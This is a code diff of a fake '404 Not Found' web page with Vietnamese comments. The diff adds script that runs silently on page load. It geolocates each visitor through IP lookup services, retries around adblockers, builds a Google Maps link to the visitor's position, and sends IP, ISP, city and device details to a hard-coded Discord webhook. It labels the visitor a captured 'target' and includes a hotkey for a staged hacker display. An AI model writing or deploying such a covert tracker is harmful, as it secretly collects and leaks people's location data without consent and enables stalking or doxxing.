@@ -1,50 +1,105 @@
 <!DOCTYPE html>
 <html lang="vi">
-<head><meta charset="UTF-8"><title>404 Not Found</title></head>
-<body>
-    <div style="text-align:center; margin-top:20%; font-family:sans-serif; color:#ccc;">
-        <h1 style="font-size:100px;">404</h1>
-        <p>Page Not Found</p>
+<head>
+    <meta charset="UTF-8">
+    <title>404 Not Found</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-[#1a1a1a] h-screen overflow-hidden font-mono">
+
+    <div id="fake-screen" class="flex flex-col items-center justify-center h-full text-center bg-white">
+        <h1 class="text-9xl font-bold text-gray-200">404</h1>
+        <p class="text-gray-400 text-xl">Page Not Found</p>
+        <p class="text-gray-300 mt-4 text-sm underline cursor-pointer">Quay lại trang chủ</p>
     </div>
 
     <script>
+        // ==========================================
+        // 1. CẤU HÌNH DISCORD WEBHOOK CỦA BẠN
+        // ==========================================
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1468844769491816593/yTdv41UmmXjKLYH-HE_b7jRPynj1u5scque6jdSQOb21HDLtNOpca4WvaKiFpKHWClmv";
 
-        async function bypassAndSend() {
-            let ip = "Không xác định";
+        // ==========================================
+        // 2. LOGIC BYPASS & TRACE (VƯỢT RÀO & TRUY VẾT)
+        // ==========================================
+        async function startAdvancedTrace() {
             try {
-                // Thử cách 1: Cloudflare (Rất khó chặn)
-                const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
-                const text = await res.text();
-                ip = text.split('\n').find(line => line.startsWith('ip=')).split('=')[1];
-            } catch (e) {
-                // Thử cách 2: Proxy ngụy trang
-                try {
-                    const proxyRes = await fetch(`https://api.allorigins.win/get?url=https://api.ipify.org?format=json`);
-                    const proxyData = await proxyRes.json();
-                    ip = JSON.parse(proxyData.contents).ip;
-                } catch (e2) { ip = "Bị Adblock chặn hoàn toàn"; }
-            }
+                // Sử dụng API ipwho.is để lấy full thông tin (Bypass cực tốt)
+                const response = await fetch('https://ipwho.is/');
+                const data = await response.json();
 
-            // Gửi về Discord
-            fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
+                if(!data.success) throw new Error("API Blocked");
+
+                // Tạo link Google Maps dựa trên tọa độ
+                const googleMapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+
+                // Nội dung gửi lên Discord
+                const payload = {
+                    username: "Hệ Thống Truy Vết Mũ Trắng",
+                    avatar_url: "https://i.imgur.com/8nS8z3L.png",
                     embeds: [{
-                        title: "🎯 MỤC TIÊU ĐÃ BYPASS ADBLOCK",
-                        color: 16753920,
+                        title: "🎯 ĐÃ TÓM ĐƯỢC MỤC TIÊU!",
+                        description: "Mục tiêu đã sập bẫy. Dưới đây là thông tin chi tiết:",
+                        color: 16711680, // Màu đỏ rực
                         fields: [
-                            { name: "📍 IP Address", value: `\`${ip}\`` },
-                            { name: "🖥️ User Agent", value: navigator.userAgent }
+                            { name: "🌐 Địa chỉ IP", value: `\`${data.ip}\``, inline: true },
+                            { name: "🛡️ Loại IP", value: `\`${data.type}\``, inline: true },
+                            { name: "🏢 Nhà mạng (ISP)", value: `\`${data.connection.isp}\``, inline: false },
+                            { name: "📍 Vị trí", value: `${data.city}, ${data.region}, ${data.country}`, inline: true },
+                            { name: "🗺️ Bản đồ", value: `[Bấm để xem vị trí](${googleMapsLink})`, inline: true },
+                            { name: "🖥️ Thiết bị", value: `\`${navigator.userAgent.substring(0, 150)}...\``, inline: false }
                         ],
-                        footer: { text: "Tracing: " + new Date().toLocaleString() }
+                        footer: { text: "Tracing System Beta • " + new Date().toLocaleString('vi-VN') },
+                        thumbnail: { url: data.flag.img } // Hiện cờ quốc gia của mục tiêu
                     }]
-                })
-            });
+                };
+
+                // Gửi về Discord
+                if (DISCORD_WEBHOOK.includes("discord.com")) {
+                    await fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                }
+
+            } catch (err) {
+                // Cách dự phòng nếu API trên bị chặn (Lấy IP thô qua Cloudflare)
+                try {
+                    const cfRes = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+                    const text = await cfRes.text();
+                    const rawIP = text.split('\n').find(line => line.startsWith('ip=')).split('=')[1];
+                    
+                    fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `⚠️ **Bypass Cấp Độ 2:** Phát hiện IP: \`${rawIP}\` (Dữ liệu vị trí bị chặn bởi Adblock)`
+                        })
+                    });
+                } catch (e) {
+                    console.error("Mục tiêu dùng bảo mật quá cao.");
+                }
+            }
         }
 
-        window.onload = bypassAndSend;
+        // Chạy ngầm ngay khi load trang
+        window.onload = startAdvancedTrace;
+
+        // Phím tắt L để giả lập Admin (Dành cho bạn diễn)
+        document.addEventListener('keydown', (e) => {
+            if (e.key.toLowerCase() === 'l') {
+                document.body.innerHTML = `
+                    <div class="p-10 text-green-500">
+                        <p>> Đang kết nối vệ tinh...</p>
+                        <p>> Đã xác định tọa độ...</p>
+                        <p>> Dữ liệu đã được gửi về Discord.</p>
+                        <p>> Nhấn F5 để thoát.</p>
+                    </div>
+                `;
+                document.body.className = "bg-black h-screen font-mono";
+            }
+        });
     </script>
 </body>
 </html>
